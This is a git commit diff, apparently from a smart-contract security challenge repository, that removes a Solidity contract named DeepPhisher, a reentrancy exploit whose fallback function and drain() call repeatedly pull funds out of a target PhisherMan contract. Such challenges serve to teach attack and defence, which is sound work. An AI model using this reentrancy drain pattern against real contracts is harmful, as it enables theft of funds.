92de6d81b7d209537b4471cfc80c9b6d70b6e20c
Jordan Earls <earlz@earlz.net>
2019-02-17 02:00:25 -0700

    Remove duplicate exploit code

--- src/quests/BadPhish/Phisher.sol
+++ src/quests/BadPhish/Phisher.sol
@@ -60,22 +60,4 @@ contract PhisherMan is PhisherInterface{
 
 
 
-//exploiter
-contract DeepPhisher{
-    function() external payable{
-        //if the next goPhish would cause contract to attempt to send more funds than available
-        if(address(msg.sender).balance < msg.value){
-            return;
-        }
-        PhisherMan s = PhisherMan(msg.sender);
-        s.goPhish(address(this), 1);
-    }
-    function drain(PhisherMan phisher) external returns (uint256){
-        phisher.goPhish(address(this), 1);
-        return address(this).balance;
-    }
-    function depositTo(PhisherMan phisher) external payable{
-        phisher.deposit.value(msg.value)();
-    }
-}
 
